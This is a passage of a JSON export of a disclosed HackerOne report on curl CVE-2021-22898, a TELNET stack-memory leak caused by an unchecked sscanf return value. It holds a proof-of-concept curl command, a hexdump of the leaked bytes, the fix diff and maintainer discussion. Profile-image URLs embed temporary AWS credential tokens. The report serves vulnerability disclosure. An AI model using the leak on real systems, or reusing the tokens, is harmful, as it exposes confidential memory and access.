@@ -1,0 +1,697 @@
+{
+  "id": 1176461,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTc2NDYx",
+  "url": "https://hackerone.com/reports/1176461",
+  "title": "CVE-2021-22898: TELNET stack contents disclosure",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2021-04-27T09:49:43.213Z",
+  "submitted_at": "2021-04-27T09:49:43.284Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nyymi",
+    "url": "/nyymi",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool for doing internet transfers"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2021-22898"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-05-26T08:24:10.415Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-05-26T08:24:10.357Z",
+  "team_member_agreed_on_going_public_at": "2021-05-26T07:25:10.683Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nlib/telnet.c `suboption` function incorrecly checks for the `sscanf` return value. Instead of checking that 2 elements are parsed, the code also continues if just one element matches:\n`if(sscanf(v->data, \"%127[^,],%127s\", varname, varval)) {`\nAs such it is possible to construct environment values that don't update the `varval` buffer and instead use the previous value. In combination of advancing in the `temp` buffer by `strlen(v->data) + 1`, this means that there will be uninitialized gaps in the generated output `temp` buffer. These gaps will contain whatever stack contents from previous operation of the application.\n\nFortunately the environment is controlled by the client and not the server. As such this vulnerability can't be exploited by the server. Practical exploitation is limited by the following requirements:\n\n- attacker is able to control the environment passed to libcurl via `CURLOPT_TELNETOPTIONS` (\"`NEW_ENV=xxx,yyy`\") and control `xxx` and `yyy` in the curl_slist entries)\n- attacker is able to either inspect the network traffic of the telnet connection or to select the server/port the connection is established to\n\nWhen both are true the attacker is able to some content of the stack. Note however that for this leak to be meaningful, some confidential or sensitive information would need to be leaked. This could happen if some key or other sensitive material (that is otherwise out of the reach of the attacker, due to for example setuid + dropping of privileges, or for example only being able to execute the command remotely in a limited fashion, for example php curl, or similar) would thus become visible fully, or partially. The leak is limited to maximum about half of the 2048 byte `temp` buffer.\n\n## Steps To Reproduce:\n\n  1. Run telnet service\n  2. tcpdump -i lo  -X -s 65535 port 23\n  2. Execute\n```\ncurl -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa telnet://127.0.0.1 <<< foo\n```\n\nYou'll see something like:\n\n```\n        0x0000:  4500 073a 9711 4000 4006 9eaa 7f00 0001  E..:..@.@.......\n        0x0010:  7f00 0001 c79c 0017 f499 4092 2173 31a0  ..........@.!s1.\n        0x0020:  8018 0200 052f 0000 0101 080a d7e7 b666  ...../.........f\n        0x0030:  d7e7 b666 fffa 2700 0061 6161 6161 6161  ...f..'..aaaaaaa\n        0x0040:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0050:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0060:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0070:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0080:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0090:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x00a0:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x00b0:  6161 6161 6161 6161 0100 0000 0000 0000  aaaaaaaa........\n        0x00c0:  0000 0000 0000 0000 0000 0000 0000 0000  ................\n        0x00d0:  0000 0000 0000 0000 0000 0000 0000 0000  ................\n        0x00e0:  0000 0000 0000 0000 0000 0000 0000 0000  ................\n        0x00f0:  0000 0000 0000 0000 0000 0000 0000 0000  ................\n        0x0100:  0000 0000 0000 0000 0000 0000 0000 0000  ................\n        0x0110:  0000 0000 0000 0000 0000 0000 0000 0000  ................\n        0x0120:  0000 0000 0000 0000 0000 0000 0000 0000  ................\n        0x0130:  0000 0000 0000 0000 0061 6161 6161 6161  .........aaaaaaa\n        0x0140:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0150:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0160:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0170:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0180:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0190:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x01a0:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x01b0:  6161 6161 6161 6161 0100 0000 6025 fec0  aaaaaaaa....`%..\n        0x01c0:  7c7f 0000 0000 0000 0000 0000 e002 0000  |...............\n        0x01d0:  0000 0000 60cd f654 7c55 0000 0088 2975  ....`..T|U....)u\n        0x01e0:  780b b94a 0000 0000 0000 0000 c45d b9aa  x..J.........]..\n        0x01f0:  fd7f 0000 a05b b9aa fd7f 0000 a05c b9aa  .....[.......\\..\n        0x0200:  fd7f 0000 2042 f754 7c55 0000 702a f754  .....B.T|U..p*.T\n        0x0210:  7c55 0000 0000 0000 0000 0000 148f e7c0  |U..............\n        0x0220:  7c7f 0000 3000 0000 3000 0000 505b b9aa  |...0...0...P[..\n        0x0230:  fd7f 0000 905a b9aa 0061 6161 6161 6161  .....Z...aaaaaaa\n        0x0240:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0250:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0260:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0270:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0280:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0290:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x02a0:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x02b0:  6161 6161 6161 6161 0100 0000 605d b9aa  aaaaaaaa....`]..\n        0x02c0:  fd7f 0000 605d b9aa fd7f 0000 695d b9aa  ....`]......i]..\n        0x02d0:  fd7f 0000 ffff ffff ffff ffff 605d b9aa  ............`]..\n        0x02e0:  fd7f 0000 ffff ffff ffff ffff 0000 0000  ................\n        0x02f0:  0000 0000 0000 0000 0000 0000 0000 0000  ................\n        0x0300:  0000 0000 0000 0000 0000 0000 0000 0000  ................\n        0x0310:  0000 0000 1000 0000 0000 0000 7413 f1c0  ............t...\n        0x0320:  7c7f 0000 0000 b9aa fd7f 0000 0000 0000  |...............\n        0x0330:  0000 0000 1000 0000 0061 6161 6161 6161  .........aaaaaaa\n        0x0340:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0350:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0360:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0370:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0380:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0390:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x03a0:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x03b0:  6161 6161 6161 6161 0100 0000 e82e f754  aaaaaaaa.......T\n        0x03c0:  7c55 0000 0000 0000 0000 0000 702a f754  |U..........p*.T\n        0x03d0:  7c55 0000 2042 f754 7c55 0000 148f e7c0  |U...B.T|U......\n        0x03e0:  7c7f 0000 3000 0000 3000 0000 105d b9aa  |...0...0....]..\n        0x03f0:  fd7f 0000 505c b9aa fd7f 0000 0088 2975  ....P\\........)u\n        0x0400:  780b b94a c05d b9aa fd7f 0000 2042 f754  x..J.].......B.T\n        0x0410:  7c55 0000 7f00 0000 0000 0000 0000 0000  |U..............\n        0x0420:  0000 0000 0000 0000 0000 0000 0100 0000  ................\n        0x0430:  0000 0000 a47b e2c0 0061 6161 6161 6161  .....{...aaaaaaa\n        0x0440:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0450:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0460:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0470:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0480:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0490:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x04a0:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x04b0:  6161 6161 6161 6161 0100 0000 aea3 e7c0  aaaaaaaa........\n        0x04c0:  7c7f 0000 1700 0000 0000 0000 1000 0000  |...............\n        0x04d0:  3000 0000 005f b9aa fd7f 0000 305e b9aa  0...._......0^..\n        0x04e0:  fd7f 0000 0180 adfb fd7f 0000 47f3 f654  ............G..T\n        0x04f0:  7c55 0000 49f3 f654 7c55 0000 40f2 f654  |U..I..T|U..@..T\n        0x0500:  7c55 0000 40f2 f654 7c55 0000 40f2 f654  |U..@..T|U..@..T\n        0x0510:  7c55 0000 40f2 f654 7c55 0000 40f2 f654  |U..@..T|U..@..T\n        0x0520:  7c55 0000 49f3 f654 7c55 0000 0000 0000  |U..I..T|U......\n        0x0530:  0000 0000 0000 0000 0061 6161 6161 6161  .........aaaaaaa\n        0x0540:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0550:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0560:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0570:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0580:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0590:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x05a0:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x05b0:  6161 6161 6161 6161 0100 0000 1f00 0000  aaaaaaaa........\n        0x05c0:  0000 0000 3001 0000 0000 0000 0000 0000  ....0...........\n        0x05d0:  0000 0000 0200 0000 3000 0000 6e00 0000  ........0...n...\n        0x05e0:  7c00 0000 0000 0000 0000 0000 5b00 0000  |...........[...\n        0x05f0:  7700 0000 0000 0000 0000 0000 0000 0000  w...............\n        0x0600:  0000 0000 8038 f754 7c55 0000 0000 0000  .....8.T|U......\n        0x0610:  0000 0000 1000 0000 0000 0000 b0ff ffff  ................\n        0x0620:  ffff ffff 805f b9aa fd7f 0000 2042 f754  ....._.......B.T\n        0x0630:  7c55 0000 1a21 f954 0061 6161 6161 6161  |U...!.T.aaaaaaa\n        0x0640:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0650:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0660:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0670:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0680:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x0690:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x06a0:  6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa\n        0x06b0:  6161 6161 6161 6161 0100 5600 0000 0000  aaaaaaaa..V.....\n        0x06c0:  0000 0000 0000 0000 0000 0000 0000 0000  ................\n        0x06d0:  0000 0000 0000 0000 0000 0000 0000 0000  ................\n        0x06e0:  0000 0000 0000 0000 0000 0000 0000 0000  ................\n        0x06f0:  0000 0000 0000 0000 0000 0000 0000 0000  ................\n        0x0700:  0000 0000 f7f9 bbaa fd7f 0000 0100 0000  ................\n        0x0710:  0000 0000 b05f b9aa fd7f 0000 0e5f 07c1  ....._......._..\n        0x0720:  7c7f 0000 0100 0000 0000 0000 417b eec0  |...........A{..\n        0x0730:  7c7f 0000 6161 6161 fff0                 |...aaaa..\n```\n\n## Fix\n```\ndiff --git a/lib/telnet.c b/lib/telnet.c\nindex f96a4cb4c..845b59db5 100644\n--- a/lib/telnet.c\n+++ b/lib/telnet.c\n@@ -921,7 +923,7 @@ static void suboption(struct Curl_easy *data)\n         size_t tmplen = (strlen(v->data) + 1);\n         /* Add the variable only if it fits */\n         if(len + tmplen < (int)sizeof(temp)-6) {\n-          if(sscanf(v->data, \"%127[^,],%127s\", varname, varval)) {\n+          if(sscanf(v->data, \"%127[^,],%127s\", varname, varval) == 2) {\n             msnprintf((char *)&temp[len], sizeof(temp) - len,\n                       \"%c%s%c%s\", CURL_NEW_ENV_VAR, varname,\n                       CURL_NEW_ENV_VALUE, varval);\n```\n\n## Impact\n\nLeak of potentially confidential information.",
+  "bounty_amount": "1000.0",
+  "formatted_bounty": "$1,000",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2021-06-25T07:25:10.760Z",
+  "allow_singular_disclosure_after": -70847261.93828417,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "0nlymohammed",
+    "0xwise",
+    "5her10c",
+    "ekgaribadmi",
+    "majidhussien"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.5,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 11529129,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you for your report!\n\nWe will take some time and investigate your reports and get back to you with details and possible follow-up questions as soon as we can!",
+      "automated_response": false,
+      "created_at": "2021-04-27T10:07:02.889Z",
+      "updated_at": "2021-04-27T10:07:02.889Z",
+      "actor": {
+        "username": "bagder",
+        "cleared": false,
+        "verified": false,
+        "url": "/bagder",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071252Z&X-Amz-Expires=3586&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=84ff8a0b7c34ee34a86130a3d0d905f8c714119e039bb8bd8ebc21ea987b393c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11533123,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "> attacker is able to control the environment passed to libcurl via CURLOPT_TELNETOPTIONS\n\nIs that even an attack scenario we can (and should) protect libcurl against? If an attacker can control what goes into specific options passed to libcurl, I would rather suggest that's an attack on the particular application, not on libcurl.",
+      "automated_response": false,
+      "created_at": "2021-04-27T14:53:16.300Z",
+      "updated_at": "2021-04-27T14:53:16.300Z",
+      "actor": {
+        "username": "bagder",
+        "cleared": false,
+        "verified": false,
+        "url": "/bagder",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071252Z&X-Amz-Expires=3586&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=84ff8a0b7c34ee34a86130a3d0d905f8c714119e039bb8bd8ebc21ea987b393c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11533253,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "> Is that even an attack scenario we can (and should) protect libcurl against?\n\nIMHO yes and yes, and the current code already tries to do that. It almost succeeds, too. The only issue I could spot is the incorrect check for `sscanf` return value.\n\nlibcurl should not crash or divulge stack contents merely if the strings passed to the library can be tampered with.  It is not far fetched to think that the attacker might be able to control number of the string parameters that end up being passed to libcurl. This can easily happen for example when using curl from php. libcurl code goes to great lengths to try validate the passed string input to avoid misbehaviour (for example the code limits the string lengths to ensure that overly long input can't result in stack buffer overflows).",
+      "automated_response": false,
+      "created_at": "2021-04-27T15:09:50.288Z",
+      "updated_at": "2021-04-27T15:09:50.288Z",
+      "actor": {
+        "username": "nyymi",
+        "cleared": false,
+        "verified": false,
+        "url": "/nyymi",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11533288,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "To add, I think that `telnet://` is probably very rarely used functionality in libcurl, and thus this issue has very small likelihood of being found exploitable in practice. In general ,however, I think that the idea of not trusting the string input is a very sensible strategy and should be enforced throughout libcurl.",
+      "automated_response": false,
+      "created_at": "2021-04-27T15:13:23.583Z",
+      "updated_at": "2021-04-27T15:13:23.583Z",
+      "actor": {
+        "username": "nyymi",
+        "cleared": false,
+        "verified": false,
+        "url": "/nyymi",
+        "profile_picture_urls": {
